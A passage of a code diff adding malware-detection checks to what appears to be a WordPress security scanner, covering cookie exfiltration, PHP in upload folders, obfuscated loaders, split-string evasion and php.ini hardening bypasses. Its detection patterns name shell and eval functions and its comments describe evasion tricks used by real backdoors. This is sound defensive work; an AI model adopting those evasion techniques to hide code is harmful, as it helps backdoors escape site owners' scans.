+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					if ( $f->getSize() > 1048576 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
+						continue;
+					}
+					$c = WPS_Utils::normalised( $path, $raw );
+
+					if ( ! preg_match( $rx_out, $c ) ) {
+						continue;
+					}
+					if ( ! preg_match( $rx_host, $c, $hm ) ) {
+						continue;
+					}
+					$host = strtolower( $hm[1] );
+
+					$what = [];
+					foreach ( $sensitive as $rx => $desc ) {
+						if ( preg_match( $rx, $c ) ) {
+							$what[ $desc ] = true;
+						}
+					}
+					if ( empty( $what ) ) {
+						continue;
+					}
+
+					$trusted = in_array( $host, $known, true );
+					$quiet   = (bool) preg_match( '/[\'"]blocking[\'"]\s*=>\s*(?:false|0)/i', $c );
+					$defer   = (bool) preg_match( '/register_shutdown_function|wp_schedule_single_event/i', $c );
+
+					$found[] = [
+						// 1.4.43: eligible for the quarantine-first remediator.
+						// This is about as content-confirmed as a finding gets -
+						// an outbound call to a hardcoded host carrying session
+						// cookies - and it is the one class of malware where
+						// leaving the file in place while the operator decides
+						// costs them another stolen session on the next login.
+						// Only when the destination is NOT a host WordPress
+						// itself uses, so a false positive on a vendor API can
+						// never trigger removal.
+						'auto_delete'  => ! $trusted,
+						'delete_path'  => $trusted ? '' : $path,
+						'severity' => $trusted ? 'high' : 'critical',
+						'type'     => 'Credentials or session cookies sent off-site',
+						'subject'  => self::display_path( $path ) . ' [' . $host . ']',
+						'path'     => $path,
+						'action'   => 'This file sends ' . implode( ' and ', array_keys( $what ) ) . ' to ' . $host . '. '
+							. 'Transmitting session cookies is not a diagnostic or an analytic: whoever receives them can '
+							. 'replay them and be signed in as that user, with no password and no failed login for any '
+							. 'security plugin to notice.'
+							. ( $defer ? ' It runs at the end of a request rather than during it, so nothing about the page appears different.' : '' )
+							. ( $quiet ? ' The request is sent without waiting for a reply, so it costs no visible delay.' : '' )
+							. ( $trusted ? ' The destination is a host WordPress itself uses, so confirm what is actually being sent before acting - but no legitimate component sends session cookies anywhere.' : '' )
+							. ' If this is on your site, treat every administrator session as compromised: remove the file, '
+							. 'then change the authentication salts in wp-config.php, which is what actually invalidates the '
+							. 'sessions already taken. Deleting the file alone does not.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_php_in_data_directory(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		if ( ! defined( 'WP_CONTENT_DIR' ) || ! is_dir( WP_CONTENT_DIR ) ) {
+			return $found;
+		}
+		$content = rtrim( WP_CONTENT_DIR, '/\\' );
+
+		$strict = [
+			'uploads' => 'the media library',
+			'fonts'   => 'font files',
+			'upgrade' => 'scratch space used during updates',
+		];
+		$loose = [
+			'cache'   => 'generated page and object caches',
+			'wflogs'  => 'a security plugin\'s logs',
+			'logs'    => 'logs',
+			'tmp'     => 'temporary files',
+			'backup'  => 'backups',
+			'backups' => 'backups',
+		];
+
+		foreach ( array_merge( $strict, $loose ) as $dir => $holds ) {
+			$base = $content . '/' . $dir;
+			if ( ! is_dir( $base ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $base, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				$count = 0;
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 20000 || self::scan_budget_exceeded() ) {
+						break;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+
+					$size = $f->getSize();
+					$c    = (string) @file_get_contents( $path );
+
+					// WordPress's own silence stubs.
+					if ( $size <= 60 ) {
+						$body = trim( $c );
+						if ( '' === $body || preg_match( '/^<\?php\s*(?:\/\/|#|\/\*).{0,60}$/s', $body ) ) {
+							continue;
+						}
+					}
+
+					// Inert by construction - see the note above.
+					if ( preg_match( '/^\s*<\?php\s*(?:@?\s*(?:exit|die)\s*\(|__halt_compiler\s*\()/i', $c ) ) {
+						continue;
+					}
+
+					$gated = (bool) preg_match( '/\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]]{0,40}\][^;]{0,80}(?:!==|!=|===|==)/', $c );
+					$quiet = (bool) preg_match( '/error_reporting\s*\(\s*0\s*\)|ini_set\s*\(\s*[\'"]display_errors/i', $c );
+
+					// Where plugins legitimately write PHP, location alone is
+					// not enough; something about the file must also be wrong.
+					if ( isset( $loose[ $dir ] ) && ! $gated && ! $quiet ) {
+						continue;
+					}
+
+					$found[] = [
+						'severity' => 'critical',
+						'type'     => 'Executable PHP in a data directory',
+						'subject'  => self::display_path( $path ) . ' [' . number_format( $size ) . ' bytes in ' . $dir . '/]',
+						'path'     => $path,
+						'action'   => 'This is a PHP file inside wp-content/' . $dir . '/, which holds ' . $holds
+							. ' and not code. Nothing legitimate installs an executable file here, which is why many hosts '
+							. 'block PHP execution in these directories outright.'
+							. ( $gated ? ' It compares a request parameter against a fixed value before doing anything, so it stays silent for anyone who does not already know that value - a password on a back door, not a feature.' : '' )
+							. ( $quiet ? ' It suppresses PHP errors, so its failures never reach your logs.' : '' )
+							. ' Judge this on where it is rather than on what it appears to do: the location is the finding. '
+							. 'If you did not put it here, treat the site as compromised and find out how it arrived.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_character_built_identifiers(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		// $var[12] . followed by another index or a literal - a character
+		// being appended to a string being spelled out.
+		$rx_chain = '/\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d{1,3}\s*\]\s*\.\s*(?=\$[A-Za-z_]|[\'"])/';
+		$rx_sink  = '/\b(?:eval|assert|create_function)\s*\(|\$[A-Za-z_][A-Za-z0-9_]*\s*\(\s*\$/';
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					// Spelling one thirteen-character function name takes about
+					// thirteen chains at roughly eight bytes each, so a minimal
+					// carrier plus its haystack string and an eval sits close
+					// to three hundred bytes. The floor is set below that
+					// rather than at it.
+					$size = $f->getSize();
+					if ( $size < 200 || $size > 4194304 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
+						continue;
+					}
+					$c = WPS_Utils::stripped( $path, $raw );
+
+					$chains = preg_match_all( $rx_chain, $c );
+					$chains = is_int( $chains ) ? $chains : 0;
+
+					// 1.4.40: chr() is the other way to spell a name without
+					// writing it. A must-use plugin recovered from a live site
+					// built its control token with 295 chr() calls and scored
+					// zero on the index-chain measure - same technique, other
+					// mechanism. Zero across eighty files of real code.
+					$chrs = preg_match_all( '/\bchr\s*\(\s*\d{1,3}/i', $c );
+					$chrs = is_int( $chrs ) ? $chrs : 0;
+
+					$built = max( $chains, $chrs );
+					if ( $built < 8 ) {
+						continue;
+					}
+
+					$sink = (bool) preg_match( $rx_sink, $c );
+					$how  = ( $chrs > $chains ) ? 'chr() calls' : 'character-index chains';
+					// Eight is already nearly three times the highest count
+					// seen in ordinary code, but a name being built and then
+					// executed removes any remaining doubt.
+					if ( ! $sink && $built < 15 ) {
+						continue;
+					}
+
+					$found[] = [
+						'severity' => ( $sink || $built >= 15 ) ? 'critical' : 'high',
+						'type'     => 'Identifiers assembled character by character',
+						'subject'  => self::display_path( $path ) . ' [' . $built . ' ' . $how . ']',
+						'path'     => $path,
+						'action'   => 'This file builds strings by taking single characters out of another string by position '
+							. 'and joining them - ' . $built . ' times. That is how a name like base64_decode is made to exist '
+							. 'without ever appearing as text, so that searching the file for it finds nothing.'
+							. ( $sink ? ' The result is then executed, which is the whole purpose of building it that way.' : '' )
+							. ' Ordinary code does this a handful of times at most, and never to spell a function name. '
+							. 'The readable parts of such a file are usually decoy: the sentence the characters are taken from '
+							. 'is chosen to look harmless. Treat the site as compromised.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_self_extracting_payload(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		$rx_selfread = '/(?:file_get_contents|fopen|readfile|file)\s*\(\s*__FILE__/i';
+		$rx_sink     = '/\b(?:eval|assert|create_function)\s*\(|preg_replace\s*\([^,]*[\'"][^\'"]*e[\'"]\s*,/i';
+		// Known vendors that legitimately ship self-protecting PHP.
+		$vendors     = [ 'monarx', 'ioncube', 'sourceguardian', 'zend guard', 'phpshield', 'sitelock', 'imunify' ];
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					$size = $f->getSize();
+					if ( $size < 500 || $size > 4194304 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
+						continue;
+					}
+					$c = WPS_Utils::stripped( $path, $raw );
+
+					if ( ! preg_match( $rx_selfread, $c ) || ! preg_match( $rx_sink, $c ) ) {
+						continue;
+					}
+
+					// Data past the final closing tag is the third leg.
+					$tail = '';
+					$pos  = strrpos( $c, '?>' );
+					if ( false !== $pos ) {
+						$tail = trim( substr( $c, $pos + 2 ) );
+					}
+					if ( strlen( $tail ) < 512 ) {
+						continue;
+					}
+
+					$vendor = '';
+					$low    = strtolower( substr( $raw, 0, 4096 ) );
+					foreach ( $vendors as $v ) {
+						if ( false !== strpos( $low, $v ) ) {
+							$vendor = $v;
+							break;
+						}
+					}
+
+					$found[] = [
+						'severity' => 'high',
+						'type'     => 'Self-extracting PHP payload',
+						'subject'  => self::display_path( $path ) . ' [' . number_format( strlen( $tail ) ) . ' bytes past the closing tag]',
+						'path'     => $path,
+						'action'   => 'This file reads its own contents, splits itself on its closing PHP tag, and executes what '
+							. 'follows - ' . number_format( strlen( $tail ) ) . ' bytes of encoded data that is not in any variable '
+							. 'or string, which is why it does not resemble ordinary obfuscation. '
+							. ( '' !== $vendor
+								? 'It carries a "' . $vendor . '" marker. Commercial security and licensing products protect their own code this way, so this may well be software your host installed rather than an intrusion. Confirm with your host before removing it.'
+								: 'Malware uses this to hide a payload; commercial security and licensing products use it to stop their own code being read. Both look identical from outside.' )
+							. ' Do not delete it on this finding alone: check whether your host or a licensed plugin installed it, and if nobody claims it, treat it as a backdoor.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_obfuscated_js_payload(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
+						continue;
+					}
+					$ext = strtolower( $f->getExtension() );
+					$is_php = self::is_php_executable( $f );
+					if ( ! $is_php && 'js' !== $ext ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					// Fifty hex identifiers fit in roughly seven hundred bytes
+					// of script plus a small PHP wrapper, so the floor is set
+					// below that rather than at a round number that would let
+					// a compact carrier through.
+					$size = $f->getSize();
+					if ( $size < 900 || $size > 8388608 ) {
+						continue;
+					}
+					$c = @file_get_contents( $path );
+					if ( false === $c ) {
+						continue;
+					}
+
+					$hex = preg_match_all( '/_0x[0-9a-f]{4,8}/i', $c );
+					$hex = is_int( $hex ) ? $hex : 0;
+
+					// A PHP file has no reason to carry any of this. A .js
+					// file might conceivably be a licence-protected vendor
+					// script, so it needs far more before it is worth saying.
+					$floor = $is_php ? 50 : 400;
+					if ( $hex < $floor ) {
+						continue;
+					}
+
+					$printed = $is_php && preg_match( '/wp_footer|wp_head|wp_print_inline_script_tag|<script|echo\s|print\s/i', $c );
+
+					$found[] = [
+						'severity' => $is_php ? 'critical' : 'high',
+						'type'     => $is_php ? 'Obfuscated JavaScript embedded in PHP' : 'Obfuscated JavaScript file',
+						'subject'  => self::display_path( $path ) . ' [' . number_format( $hex ) . ' obfuscated identifiers]',
+						'path'     => $path,
+						'action'   => ( $is_php
+								? 'This PHP file carries ' . number_format( $hex ) . ' JavaScript identifiers renamed to hexadecimal tokens, the signature of an automated JavaScript obfuscator. The PHP around it may read perfectly normally - it is only the envelope; the payload is the script it carries'
+									. ( $printed ? ', and this file prints that script into your pages' : '' ) . '. '
+								: 'This script has ' . number_format( $hex ) . ' identifiers renamed to hexadecimal tokens, the signature of an automated JavaScript obfuscator. ' )
+							. 'Minified code is not obfuscated code: minifiers shorten names, they do not rename everything to hex, and a legitimate minified bundle scores zero on this. '
+							. 'Obfuscation of a script that runs in your visitors\' browsers is done to stop anyone reading what it does. '
+							. 'Deobfuscate it before deciding, or compare the file against a known-good copy from the vendor.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_hidden_identifiers(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		// Names worth hiding. Each is something a scanner, or an
+		// administrator reading their own code, would search for.
+		$sensitive = [
+			'HTTP_USER_AGENT', 'HTTP_REFERER', 'REMOTE_ADDR',
+			'base64_decode', 'gzinflate', 'gzuncompress', 'str_rot13', 'eval', 'assert',
+			'move_uploaded_file', 'file_put_contents', 'shell_exec', 'system', 'passthru',
+			'curl_exec', 'file_get_contents', 'fsockopen',
+			'wp_footer', 'wp_head', 'admin_init', 'send_headers', 'body_class',
+			'register_rest_route', 'heartbeat_settings', 'wp_print_inline_script_tag',
+			'is_user_logged_in', 'current_user_can', 'administrator', 'wp_get_current_user',
+			'googlebot', 'bingbot', 'yandex', 'spider', 'crawl', 'lighthouse', 'duckduck',
+			'DONOTCACHEPAGE', 'DONOTCACHEOBJECT', 'DONOTMINIFY', 'nocache_headers',
+		];
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
+						continue;
+					}
+					if ( ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					$size = $f->getSize();
+					if ( $size < 200 || $size > 1048576 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
+						continue;
+					}
+					$joined = WPS_Utils::deobfuscate_literals( $raw );
+					if ( $joined === $raw ) {
+						continue; // nothing was split at all
+					}
+
+					$hidden = [];
+					foreach ( $sensitive as $name ) {
+						$q = preg_quote( $name, '/' );
+						if ( ! preg_match( '/' . $q . '/i', $raw ) && preg_match( '/' . $q . '/i', $joined ) ) {
+							$hidden[] = $name;
+						}
+					}
+					if ( count( $hidden ) < 2 ) {
+						continue;
+					}
+
+					// The names chosen say what the file is for.
+					$audience = array_intersect( $hidden, [ 'googlebot', 'bingbot', 'yandex', 'spider', 'crawl', 'lighthouse', 'duckduck', 'is_user_logged_in', 'administrator', 'current_user_can' ] );
+
+					$found[] = [
+						'severity' => count( $hidden ) >= 4 ? 'critical' : 'high',
+						'type'     => 'Identifiers hidden from search (split-string evasion)',
+						'subject'  => self::display_path( $path ) . ' [' . count( $hidden ) . ' hidden: ' . implode( ', ', array_slice( $hidden, 0, 5 ) ) . ']',
+						'path'     => $path,
+						'action'   => 'This file writes ' . count( $hidden ) . ' significant names in pieces joined back together at runtime - '
+							. implode( ', ', $hidden ) . ' - so that searching the file for any of them finds nothing. '
+							. 'There is no reason to write a function name in fragments except to defeat the search someone '
+							. 'will run for it.'
+							. ( $audience ? ' The names it hides include ' . implode( ', ', $audience ) . ', which means it is choosing who sees its behaviour - typically hiding from search engines and from whoever administers the site.' : '' )
+							. ' Note that the file may otherwise look entirely ordinary, and its actual payload may live outside '
+							. 'any PHP file, so judge it on this evasion rather than on how readable the rest of it appears.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_hardening_bypass_config(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		$rx_ini = [
+			'/^\s*disable_functions\s*=\s*(?:NONE|none|""|\'\'|\s*$)/m' => 'switches off the host\'s list of disabled PHP functions',
+			'/^\s*open_basedir\s*=\s*(?:OFF|off|NONE|none|""|\'\')/m'      => 'removes the directory restriction that confines PHP to your site',
+			'/^\s*safe_mode\s*=\s*(?:Off|off|0)/m'                        => 'disables safe mode',
+			'/^\s*(?:exec|shell_exec|system|passthru|popen)\s*=\s*(?:ON|on|1)/m' => 're-enables shell command execution',
+		];
+
+		$roots = [];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		foreach ( $roots as $root ) {
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 12000 ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
+						continue;
+					}
+					$name = strtolower( $f->getFilename() );
+					if ( ! in_array( $name, [ 'php.ini', '.user.ini' ], true ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					if ( $f->getSize() > 65536 ) {
+						continue;
+					}
+					$c = @file_get_contents( $path );
+					if ( false === $c ) {
+						continue;
+					}
+
+					$why = [];
+					foreach ( $rx_ini as $rx => $does ) {
+						if ( preg_match( $rx, $c ) ) {
+							$why[] = $does;
+						}
+					}
+					if ( empty( $why ) ) {
+						continue;
+					}
+
+					$found[] = [
+						'severity' => 'critical',
+						'type'     => 'PHP configuration dropped to weaken the server',
+						'subject'  => self::display_path( $path ) . ' [' . count( $why ) . ' setting(s)]',
+						'path'     => $path,
+						'action'   => 'This configuration file ' . implode( ', and ', $why ) . '. '
+							. 'On CGI and FastCGI hosting a php.ini inside a directory is honoured for scripts in it, so this '
+							. 'undoes the protections your host put in place to contain exactly this kind of break-in. '
+							. 'It is not itself malicious code, which is why a scanner reading only PHP will never mention it - '
+							. 'it is what makes the next piece of malicious code work. '
+							. 'WordPress does not need such a file anywhere inside wp-content. If you did not create it, delete '
+							. 'it and look for what put it there.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_encoded_payload_loader(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		$decoders = [
+			'base64_decode', 'gzinflate', 'gzuncompress', 'gzdecode',
+			'str_rot13', 'strrev', 'convert_uudecode', 'hex2bin', 'bin2hex',
+		];
+		$rx_sink = '/\b(?:eval|assert|create_function)\s*\(/i';
+		$rx_blob = '/[\'"][A-Za-z0-9+\/=]{200,}[\'"]/';
+		$rx_quiet = '/error_reporting\s*\(\s*0\s*\)|ini_set\s*\(\s*[\'"]display_errors[\'"]\s*,\s*(?:0|[\'"]0[\'"]|false)|ini_set\s*\(\s*[\'"]error_log[\'"]\s*,\s*(?:NULL|null)/i';
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 5 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
+						continue;
+					}
+					if ( ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					$size = $f->getSize();
+					if ( $size < 200 || $size > 2097152 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw ) {
+						continue;
+					}
+					// 1.4.37: comments are removed before matching, because PHP
+					// allows one between a function name and its bracket -
+					// `/**\/@eval/**\/($x)` calls eval while defeating every
+					// pattern that expects only whitespace there.
+					$c = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;
+
+					if ( ! preg_match( $rx_sink, $c ) || ! preg_match( $rx_blob, $c ) ) {
+						continue;
+					}
+
+					$hits = [];
+					foreach ( $decoders as $fn ) {
+						// Deliberately NOT requiring a bracket: the technique
+						// exists precisely to separate the name from the call.
+						if ( preg_match( '/\b' . preg_quote( $fn, '/' ) . '\b/i', $c ) ) {
+							$hits[] = $fn;
+						}
+					}
+					if ( count( $hits ) < 2 ) {
+						continue;
+					}
+
+					$quiet  = (bool) preg_match( $rx_quiet, $c );
+					$hidden = ( $raw !== $c );
+
+					$found[] = [
+						'severity' => 'critical',
+						'type'     => 'Encoded payload behind a decoder chain',
+						'subject'  => self::display_path( $path ) . ' [' . implode( ' -> ', array_slice( $hits, 0, 4 ) ) . ']',
+						'path'     => $path,
+						'action'   => 'This file executes code it decodes at runtime, through ' . count( $hits )
+							. ' layers - ' . implode( ', ', $hits ) . ' - wrapped around a large encoded string. '
+							. 'Nothing legitimate needs to conceal what it runs from the person running it.'
+							. ( $hidden ? ' The decoder names are split across string concatenation so that a plain search for them finds nothing, which is deliberate evasion rather than style.' : '' )
+							. ( $quiet ? ' It also suppresses PHP errors and the error log, so its failures never reach you.' : '' )
+							. ' The visible file is only a loader; what it actually does is inside the encoded blob and cannot be judged from reading it. Treat the site as compromised.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
+	private static function check_unauthenticated_file_manager(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		// Primitives that CHANGE the filesystem. Reads alone are not enough:
+		// plenty of legitimate code reads files from a request.
+		$mutators = [
+			'move_uploaded_file' => 'upload arbitrary files',
+			'file_put_contents'  => 'overwrite arbitrary files',
+			'unlink'             => 'delete arbitrary files',
+			'rename'             => 'rename arbitrary files',
+			'rmdir'              => 'remove directories',
+			'copy'               => 'copy arbitrary files',
+			'fwrite'             => 'write to arbitrary files',
+		];
+
+		// 1.4.38: php://input counts as request input. A recovered backdoor
+		// read its payload from the raw request body rather than from any
+		// superglobal, and so did not look request-driven at all.
+		$rx_request   = '/\$_(?:GET|POST|FILES|REQUEST|COOKIE)\b|php:\/\/input/i';
+		// Anything that indicates the file runs inside WordPress. A file that
+		// loads WordPress is subject to whatever that install already does.
+		// 1.4.34: this must test for a GUARD, not for the mere mention of
+		// WordPress. The first version matched `wp-load.php` and treated it as
+		// evidence of legitimacy, which is backwards - a file that REQUIRES
+		// wp-load.php is bootstrapping WordPress itself, which is exactly what
+		// a standalone shell does when it wants WordPress's functions. The
+		// legitimate pattern is the opposite: a file REFUSING to run unless
+		// WordPress already loaded it. A recovered sample walked straight
+		// through the old test by requiring wp-load.
+		$rx_bootstrap = '/defined\s*\(\s*[\'"](?:ABSPATH|WPINC|WP_UNINSTALL_PLUGIN)[\'"]\s*\)/i';
+		// Any authorisation of any kind, WordPress or otherwise.
+		// 1.4.34: real authorisation only. The first version accepted a bare
+		// $_SESSION or crypt(), which prove nothing - a shell uses a session to
+		// remember its OWN login and crypt() to check its OWN password. A half
+		// megabyte file manager escaped on the $_SESSION clause alone.
+		$rx_auth      = '/current_user_can|is_user_logged_in|wp_verify_nonce|check_admin_referer|check_ajax_referer|PHP_AUTH_USER/i';
+		// A browser-facing interface. A shell has one; a utility rarely does.
+		$rx_ui        = '/<form[^>]*method\s*=\s*[\'"]?post|<input[^>]+type\s*=\s*[\'"]?file/i';
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 5 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
